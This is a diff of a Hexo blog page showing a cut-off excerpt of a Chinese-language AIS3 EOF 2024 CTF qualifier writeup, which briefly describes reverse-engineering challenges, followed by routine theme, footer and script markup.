+      <h2 class="post-title">AIS3 EOF 2024 Qual Writeup</h2>
+      <article class="post-article">
+        
+          
+Author:堇姬NaupRank : 42
+
+image
+MiscWelcome簽到 DC就有
+image
+reverseFlag Generator題目會把這坨Block寫進flag.exe(原本看了一陣子，不是很理解她在幹嘛www，後來我突然看懂了那一坨東西我根本不用理解她在幹嘛)image
+image
+直接用x64gdb抓參數，看他把甚麼寫進去就行了把寫了甚麼截下來，然後包回.exe就行了image
+stateful幸好我都使用工人智慧把式子抓出來image有Correct!!!跟WRONG!!!，直接去state_machine()看dest怎麼產生。你會看到50個state，他會
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+
+
+  <nav id="page-nav" data-aos="fade-up">
+    
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
+  </nav>
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        131.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        11:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
 </footer>
 
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">55</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
 
-    <!-- After footer scripts -->
-    <!-- jQuery -->
-<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+    
+  </div>
+  
+</nav>
 
-<!-- For drop down -->
-<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
-
-<!-- Bootstrap -->
-<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
-<!-- Gallery -->
-<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
-<!-- Busuanzi -->
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
 
 
-<!-- Search script -->
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
 
-<script src="/js/search.js"></script>
 
-<script type="text/javascript">
-    $(function () {
-        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+       
+    
+    
+      
+    
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
     });
+  }
 </script>
 
 
 
-<script src="/js/main.js"></script>
 
 
 
-    <!-- Search Modal -->
-    <!-- Modal -->
-<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
-    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-        <div class="modal-content overflow-auto">
-            <div class="modal-header">
-                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
-                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="modal-body">
-                <div id="searchResult">
-                    <div class="search-empty text-center text-muted p-5">
-                        <i class="far fa-meh"></i>
-                    </div>
-                </div>
-            </div> 
-        </div>
-    </div>
-</div>
 
+  </body>
+  </html>
 
-</body>
-</html>
